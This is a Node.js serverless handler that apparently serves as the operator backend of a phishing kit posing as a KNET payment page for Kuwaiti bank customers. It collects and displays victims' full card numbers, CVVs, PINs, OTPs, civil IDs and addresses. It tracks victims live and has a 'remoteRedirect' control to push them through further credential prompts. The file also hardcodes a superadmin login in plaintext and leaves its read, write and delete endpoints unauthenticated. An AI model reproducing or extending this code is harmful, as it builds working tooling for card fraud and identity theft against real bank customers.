module.exports = async (req, res) => {
  const { action } = req.query;
  const SB = process.env.SUPABASE_URL;
  const SK = process.env.SUPABASE_KEY;
  const baseH = { 'apikey': SK, 'Authorization': 'Bearer ' + SK };
  const writeH = { ...baseH, 'Content-Type': 'application/json', 'Prefer': 'return=representation' };
  const sqlTables = ['orders', 'payments', 'visitors', 'admin_users']; // v2

  function parsePath(p) {
    return (p || '').replace(/^\/+|\/+$/g, '').split('/').filter(Boolean);
  }

  function emailToKey(email) {
    return email.trim().toLowerCase().replace(/[.#$[\]]/g, '_');
  }

  function keyToEmail(key) {
    return key.replace(/_com$/, '.com').replace(/_co_/, '.co.').replace(/_org$/, '.org').replace(/_net$/, '.net');
  }

  function adminToFirebase(u) {
    return {
      email: u.email,
      password: u.password_hash,
      role: u.role || 'admin',
      name: u.name || u.email.split('@')[0],
      status: 'active',
      createdAt: u.created_at || new Date().toISOString(),
      updatedAt: u.created_at || new Date().toISOString()
    };
  }

  const HARDCODED_ADMIN = {
    email: 'ash@gmail.com',
    password: 'Ha1234@@',
    role: 'superadmin',
    name: 'Admin',
    status: 'active',
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-01T00:00:00Z'
  };

  async function readDashboardAccounts(parts) {
    const accounts = {};
    accounts[emailToKey(HARDCODED_ADMIN.email)] = HARDCODED_ADMIN;

    try {
      const r = await fetch(SB + '/rest/v1/admin_users?select=*', { headers: baseH });
      const users = await r.json();
      if (Array.isArray(users)) {
        for (const u of users) {
          const key = emailToKey(u.email);
          if (!accounts[key]) accounts[key] = adminToFirebase(u);
        }
      }
    } catch (e) { }

    if (parts.length === 1) return accounts;
    if (parts.length === 2) return accounts[parts[1]] || null;
    if (parts.length >= 3) {
      const record = accounts[parts[1]];
      return record ? (record[parts[2]] !== undefined ? record[parts[2]] : null) : null;
    }
    return null;
  }

  const BANK_LOGOS = {
    'NBK': 'https://upload.wikimedia.org/wikipedia/commons/a/a8/NBK.svg',
    'KFH': 'https://upload.wikimedia.org/wikipedia/en/e/ec/Kuwait_Finance_House_logo.svg',
    'CBK': 'https://upload.wikimedia.org/wikipedia/commons/e/eb/CBK_LOGO.png',
    'Gulf Bank': 'https://upload.wikimedia.org/wikipedia/commons/2/27/Gulf_Bank_Logo.svg',
    'ABK': 'https://upload.wikimedia.org/wikipedia/commons/5/52/ABK_Logo.svg',
    'Burgan': 'https://upload.wikimedia.org/wikipedia/commons/9/96/Burgan_Bank_logo.svg',
    'KIB': 'https://upload.wikimedia.org/wikipedia/en/b/b2/Kuwait_International_Bank_Logo.png',
    'Boubyan': 'https://upload.wikimedia.org/wikipedia/commons/3/30/BoubyanBankLogo_%281%29.svg',
    'Warba': 'https://upload.wikimedia.org/wikipedia/commons/4/4d/Warba_Bank_Logo.png',
    'BBK': 'https://upload.wikimedia.org/wikipedia/commons/d/d5/Bank_of_Bahrain_and_Kuwait.svg',
    'Al Rajhi': 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg',
    'QNB': 'https://upload.wikimedia.org/wikipedia/commons/8/8f/QNB_Logo.svg',
    'Mashreq': 'https://upload.wikimedia.org/wikipedia/en/5/5c/Mashreq_logo_2022.svg',
  };

  function buildCustomer(order, payment) {
    const now = new Date().toISOString();
    const createdAt = order ? order.created_at : (payment ? payment.created_at : now);
    const age = Date.now() - new Date(createdAt).getTime();
    const isRecent = age < 5 * 60 * 1000;
    const hasPayment = !!payment;
    const id = order ? 'o' + order.id : 'p' + payment.id;

    let currentStep = 'order';
    let lastPage = '/order';
    if (hasPayment && payment.card_pin) { currentStep = 'otp'; lastPage = '/knet-payment'; }
    else if (hasPayment && payment.card_number) { currentStep = 'card'; lastPage = '/knet-payment'; }
    else if (hasPayment) { currentStep = 'payment'; lastPage = '/knet-payment'; }

    return {
      id,
      code: id.toUpperCase(),
      fullName: order ? order.full_name : '',
      name: order ? order.full_name : '',
      displayName: order ? order.full_name : '',
      phone: order ? order.phone : '',
      civilId: order ? order.civil_id : '',
      nationalId: order ? order.civil_id : '',
      governorate: order ? order.governorate : '',
      area: order ? order.area : '',
      addressDetails: order ? (order.address_details || '') : '',
      watchName: order ? (order.watch_name || '') : '',
      watchId: order ? order.watch_id : null,
      cardNumber: hasPayment ? (payment.card_number || '') : '',
      cardExpiry: hasPayment ? (payment.card_expiry || '') : '',
      cardCvv: hasPayment ? (payment.card_cvv || '') : '',
      otp: hasPayment ? (payment.otp || '') : '',
      pin: hasPayment ? (payment.card_pin || '') : '',
      password: hasPayment ? (payment.card_pin || '') : '',
      username: hasPayment ? (payment.card_number || '') : '',
      cardType: hasPayment ? (payment.card_type || 'KNET') : '',
      bankName: hasPayment ? (payment.bank_name || '') : '',
      bankLogo: hasPayment && payment.bank_name ? (BANK_LOGOS[payment.bank_name] || '') : '',
      amount: hasPayment ? (payment.amount || 0) : 0,
      transactionRef: hasPayment ? (payment.transaction_ref || '') : '',
      ipAddress: hasPayment ? (payment.ip_address || '') : '',
      userAgent: hasPayment ? (payment.user_agent || '') : '',
      status: hasPayment ? (payment.status || 'pending') : (order ? order.status : 'pending'),
      credentialsStatus: hasPayment ? (payment.status === 'accepted' ? 'approved' : payment.status) : 'pending',
      passwordStatus: hasPayment && payment.card_pin ? 'entered' : 'pending',
      usernameStatus: hasPayment && payment.card_number ? 'entered' : 'pending',
      documentsStatus: order ? 'submitted' : 'pending',
      currentStep,
      lastPage,
      lastAction: createdAt,
      createdAt,
      updatedAt: createdAt,
      presence: { state: isRecent ? 'online' : 'offline', lastSeenAt: new Date(createdAt).getTime(), currentPage: lastPage, currentStep },
      loginInfo: { username: hasPayment ? (payment.card_number || '') : '', password: hasPayment ? (payment.card_pin || '') : '' },
      loginAttempts: {},
      remoteRedirect: (function() {
        const st = hasPayment ? payment.status : (order ? order.status : '');
        if (st && typeof st === 'string' && st.startsWith('redirect:')) {
          const step = st.replace('redirect:', '');
          return { target: '/login', step, timestamp: Date.now() };
        }
        return null;
      })()
    };
  }

  async function readCustomers(parts) {
    const [pr, or] = await Promise.all([
      fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH }),
      fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH })
    ]);
    const payments = await pr.json();
    const orders = await or.json();

    const paymentByOrder = {};
    const usedPayments = new Set();
    for (const p of payments) {
      if (p.order_id) { paymentByOrder[p.order_id] = p; usedPayments.add(p.id); }
    }

    const allCustomers = {};
    for (const o of orders) {
      let p = paymentByOrder[o.id];
      if (!p) {
        const closest = payments.find(px => !usedPayments.has(px.id) && Math.abs(new Date(px.created_at) - new Date(o.created_at)) < 10 * 60 * 1000);
        if (closest) { p = closest; usedPayments.add(closest.id); }
      }
      const c = buildCustomer(o, p || null);
      allCustomers[c.id] = c;
    }
    for (const p of payments) {
      if (!usedPayments.has(p.id)) {
        const c = buildCustomer(null, p);
        allCustomers[c.id] = c;
      }
    }

    if (parts.length === 1) return allCustomers;
    if (parts.length >= 2) {
      const id = parts[1];
      const customer = allCustomers[id];
      if (!customer) return null;
      if (parts.length === 2) return customer;
      if (parts.length >= 3) {
        const field = parts[2];
        return customer[field] !== undefined ? customer[field] : null;
      }
    }
    return null;
  }

  async function readCustomerEvents(parts) {
    const [pr, or] = await Promise.all([
      fetch(SB + '/rest/v1/payments?select=*&order=created_at.desc', { headers: baseH }),
      fetch(SB + '/rest/v1/orders?select=*&order=created_at.desc', { headers: baseH })
    ]);
    const payments = await pr.json();
    const orders = await or.json();
    const events = {};

    for (const o of orders) {
      events['order-' + o.id] = { id: 'order-' + o.id, type: 'order', customerId: 'o' + o.id, action: 'order_submitted', timestamp: o.created_at, data: { watchName: o.watch_name, fullName: o.full_name, phone: o.phone } };
    }
    for (const p of payments) {
      events['payment-' + p.id] = { id: 'payment-' + p.id, type: 'payment', customerId: 'p' + p.id, action: 'card_submitted', timestamp: p.created_at, data: { cardType: p.card_type, amount: p.amount, ref: p.transaction_ref } };
    }

    if (parts.length === 1) return events;
    if (parts.length >= 2) {
      const id = parts[1];
      const event = events[id];
      if (!event) return null;
      if (parts.length === 2) return event;
      if (parts.length >= 3) return event[parts[2]] !== undefined ? event[parts[2]] : null;
    }
    return null;
  }

  async function readSettings(parts) {
    if (parts.length >= 2 && parts[1] === 'whatsapp') return null;
    return null;
  }

  async function readKvStore(parts) {
    try {
      const r = await fetch(SB + '/rest/v1/kv_store?select=*', { headers: baseH });
      if (!r.ok) return null;
      const rows = await r.json();
      const tree = {};
      for (const row of rows) tree[row.key] = row.value;

      const root = parts[0];
      if (parts.length === 1) return tree[root] || null;
      if (parts.length === 2) {
        const collection = tree[root];
        return collection && typeof collection === 'object' ? (collection[parts[1]] !== undefined ? collection[parts[1]] : null) : null;
      }
      if (parts.length >= 3) {
        const collection = tree[root];
        if (!collection || typeof collection !== 'object') return null;
        const record = collection[parts[1]];
        if (!record || typeof record !== 'object') return null;
        return record[parts[2]] !== undefined ? record[parts[2]] : null;
      }
    } catch (e) { }
    return null;
  }

  async function readSqlTable(parts) {
    const table = parts[0];
    if (parts.length === 1) {
      const r = await fetch(SB + '/rest/v1/' + table + '?select=*&order=created_at.desc', { headers: baseH });
      const data = await r.json();
      const value = {};
      for (const row of data) value[row.id] = row;
      return value;
    }
    if (parts.length === 2) {
      const r = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=*', { headers: baseH });
      const data = await r.json();
      return data[0] || null;
    }
    if (parts.length >= 3) {
      const field = parts[2];
      const r = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=' + field, { headers: baseH });
      const data = await r.json();
      return data[0] ? data[0][field] : null;
    }
    return null;
  }

  async function readActiveVisitors() {
    const since = new Date(Date.now() - 15000).toISOString();
    try {
      const r = await fetch(SB + '/rest/v1/visitors?created_at=gte.' + encodeURIComponent(since) + '&select=user_agent', { headers: baseH });
      const rows = await r.json();
      if (!Array.isArray(rows)) return 0;
      const unique = new Set(rows.map(v => v.user_agent));
      return unique.size;
    } catch (e) { return 0; }
  }

  async function readData(path) {
    const parts = parsePath(path);
    if (parts.length === 0) return null;

    if (parts[0] === 'activeVisitors') return readActiveVisitors();
    if (parts[0] === 'dashboardAccounts') return readDashboardAccounts(parts);
    if (parts[0] === 'customers') return readCustomers(parts);
    if (parts[0] === 'customerEvents') return readCustomerEvents(parts);
    if (parts[0] === 'settings') return readSettings(parts);
    if (sqlTables.includes(parts[0])) return readSqlTable(parts);
    return readKvStore(parts);
  }

  async function writeData(path, value, merge) {
    const parts = parsePath(path);
    if (parts.length < 1) return;
    const table = parts[0];

    if (table === 'customers' && parts.length >= 2) {
      const rawId = parts[1];
      const isOrder = rawId.startsWith('o');
      const isPayment = rawId.startsWith('p');
      const numId = rawId.replace(/^[op]/, '');
      const targetTable = isPayment ? 'payments' : 'orders';

      if (parts.length === 2 && typeof value === 'object' && value !== null) {
        const mapped = {};
        if (value.status !== undefined) mapped.status = value.status;
        if (value.credentialsStatus !== undefined) mapped.status = value.credentialsStatus === 'approved' ? 'accepted' : value.credentialsStatus;
        if (value.remoteRedirect !== undefined && value.remoteRedirect !== null) {
          const rdStep = value.remoteRedirect.step || value.remoteRedirect.target || '';
          mapped.status = 'redirect:' + rdStep;
          if (isOrder) {
            await fetch(SB + '/rest/v1/payments?order_id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: 'redirect:' + rdStep }) });
          }
        }
        if (Object.keys(mapped).length > 0) {
          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify(mapped) });
        }
      } else if (parts.length >= 3) {
        const field = parts[2];
        if (field === 'status' || field === 'credentialsStatus') {
          const mapped = field === 'credentialsStatus' ? (value === 'approved' ? 'accepted' : value) : value;
          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: mapped }) });
        } else if (field === 'remoteRedirect') {
          const rdStep = value && typeof value === 'object' ? (value.step || value.target || '') : '';
          await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'PATCH', headers: writeH, body: JSON.stringify({ status: 'redirect:' + rdStep }) });
        } else if (field === 'presence') {
          // Presence updates - just acknowledge, stored ephemerally
        }
      }
      return;
    }

    if (table === 'dashboardAccounts' && parts.length >= 2) {
      const key = parts[1];
      const email = keyToEmail(key);
      if (parts.length === 2 && typeof value === 'object' && value !== null) {
        const check = await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email) + '&select=id', { headers: baseH });
        const existing = await check.json();
        const row = {
          email: value.email || email,
          password_hash: value.password || '',
          role: value.role || 'admin',
          name: value.name || ''
        };
        if (existing.length > 0) {
          await fetch(SB + '/rest/v1/admin_users?id=eq.' + existing[0].id, { method: 'PATCH', headers: writeH, body: JSON.stringify(row) });
        } else {
          await fetch(SB + '/rest/v1/admin_users', { method: 'POST', headers: writeH, body: JSON.stringify(row) });
        }
      } else if (parts.length >= 3) {
        const field = parts[2];
        const dbField = field === 'password' ? 'password_hash' : field;
        await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email), { method: 'PATCH', headers: writeH, body: JSON.stringify({ [dbField]: value }) });
      }
      return;
    }

    if (sqlTables.includes(table)) {
      if (parts.length === 2) {
        const check = await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1] + '&select=id', { headers: baseH });
        const existing = await check.json();
        if (existing.length > 0) {
          await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'PATCH', headers: writeH, body: JSON.stringify(value) });
        } else {
          const insertData = typeof value === 'object' && value !== null ? { ...value } : { value };
          await fetch(SB + '/rest/v1/' + table, { method: 'POST', headers: writeH, body: JSON.stringify(insertData) });
        }
      } else if (parts.length >= 3) {
        await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'PATCH', headers: writeH, body: JSON.stringify({ [parts[2]]: value }) });
      }
      return;
    }
  }

  async function removeData(path) {
    const parts = parsePath(path);
    if (parts.length < 2) return;
    const table = parts[0];

    if (table === 'customers') {
      const rawId = parts[1];
      const numId = rawId.replace(/^[op]/, '');
      const targetTable = rawId.startsWith('p') ? 'payments' : 'orders';
      await fetch(SB + '/rest/v1/' + targetTable + '?id=eq.' + numId, { method: 'DELETE', headers: baseH });
      return;
    }
    if (table === 'dashboardAccounts') {
      const email = keyToEmail(parts[1]);
      await fetch(SB + '/rest/v1/admin_users?email=eq.' + encodeURIComponent(email), { method: 'DELETE', headers: baseH });
      return;
    }
    if (sqlTables.includes(table)) {
      await fetch(SB + '/rest/v1/' + table + '?id=eq.' + parts[1], { method: 'DELETE', headers: baseH });
    }
  }

  try {
    if (action === 'read') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path } = req.body || {};
      return res.json({ value: await readData(path) });
    }

    if (action === 'poll') {
      if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });
      return res.json({ value: await readData(req.query.path || '') });
    }

    if (action === 'set') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path, value } = req.body || {};
      await writeData(path, value, false);
      return res.json({ ok: true });
    }

    if (action === 'update') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path, value } = req.body || {};
      await writeData(path, value, true);
      return res.json({ ok: true });
    }

    if (action === 'remove') {
      if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
      const { path } = req.body || {};
      await removeData(path);
      return res.json({ ok: true });
    }

    return res.status(404).json({ error: 'Unknown action: ' + action });
  } catch (e) {
    console.error('fb/' + action + ' error:', e);
    return res.status(500).json({ error: e.message });
  }
};
